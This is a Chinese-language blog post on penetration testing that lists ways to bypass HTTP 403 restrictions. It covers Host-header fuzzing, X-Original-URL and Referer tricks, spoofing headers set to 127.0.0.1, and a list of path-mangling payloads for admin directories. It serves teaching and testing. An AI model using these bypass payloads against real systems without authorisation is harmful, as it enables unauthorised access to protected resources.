# 渗透测试如何利用403




今天面试问到这个问题了，我大概是知道怎么利用，就是说不太出来...哎还是用文字总结一下吧！



## 1.端口利用

扫描主机端口，找其它开放web服务的端口，访问其端口，挑软柿子。





## 2.修改HOST

**Host在请求头中的作用：**在一般情况下，几个网站可能会部署在同一个服务器上，或者几个 web 系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。

而很多WEB应用通过获取HTTP HOST头来获得当前请求访问的位置，但是很多开发人员并未意识到HTTP HOST头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。



修改客户端请求头中的 Host 可以通过**修改 Host 值**修改为子域名或者ip来绕过来进行绕过二级域名；



**首先**对该目标域名进行子域名收集，整理好子域名资产（host字段同样支持IP地址）。先Fuzz测试跑一遍收集到的子域名，这里使用的是Burp的Intruder功能。若看到一个服务端返回200的状态码，即表面成功找到一个在HOST白名单中的子域名。我们利用firefox插件来修改HOST值，成功绕过访问限制。







## 3.覆盖请求 URL

尝试使用 **X-Original-URL** 和 X-Rewrite-URL 标头绕过 Web 服务器的限制。

通过支持 X-Original-URL 和 X-Rewrite-URL 标头，用户可以使用 X-Original-URL 或 X-Rewrite-URL HTTP 请求标头**覆盖请求 URL 中的路径，尝试绕过对更高级别的缓存和 Web 服务器的限制**

```
Request
GET /auth/login HTTP/1.1
Response
HTTP/1.1 403 Forbidden

Reqeust
GET / HTTP/1.1
X-Original-URL: /auth/login
Response
HTTP/1.1 200 OK

or

Reqeust
GET / HTTP/1.1
X-Rewrite-URL: /auth/login
Response
HTTP/1.1 200 OK

```





## 4.Referer 标头绕过

尝试使用 Referer 标头绕过 Web 服务器的限制。

介绍：Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源。

```
Request
GET /auth/login HTTP/1.1
Host: xxx
Response
HTTP/1.1 403 Forbidden

Reqeust
GET / HTTP/1.1
Host: xxx
ReFerer:https://xxx/auth/login
Response
HTTP/1.1 200 OK

or

Reqeust
GET /auth/login HTTP/1.1
Host: xxx
ReFerer:https://xxx/auth/login
Response
HTTP/1.1 200 OK

```





## 5.代理 IP

一般开发者会通过 Nginx 代理识别访问端 IP 限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host 等标头绕过 Web 服务器的限制。

```bash
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

```

如：

```
Request
GET /auth/login HTTP/1.1
Response
HTTP/1.1 401 Unauthorized

Reqeust
GET /auth/login HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1
Response
HTTP/1.1 200 OK

```





## 6.扩展名绕过

基于扩展名，用于绕过 403 受限制的目录。

```
site.com/admin => 403
site.com/admin/ => 200
site.com/admin// => 200
site.com//admin// => 200
site.com/admin/* => 200
site.com/admin/*/ => 200
site.com/admin/. => 200
site.com/admin/./ => 200
site.com/./admin/./ => 200
site.com/admin/./. => 200
site.com/admin/./. => 200
site.com/admin? => 200
site.com/admin?? => 200
site.com/admin??? => 200
site.com/admin..;/ => 200
site.com/admin/..;/ => 200
site.com/%2f/admin => 200
site.com/%2e/admin => 200
site.com/admin%20/ => 200
site.com/admin%09/ => 200
site.com/%20admin%20/ => 200

```



## 7.扫描的时候

遇到 403 了，上目录扫描工具，扫目录，扫文件（<font color=red>记住，扫描的时候要打开探测403，因为有些网站的目录没有权限访问会显示403，但是在这个目录下面的文件，我们或许能扫描到并访问</font> ）











---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/  

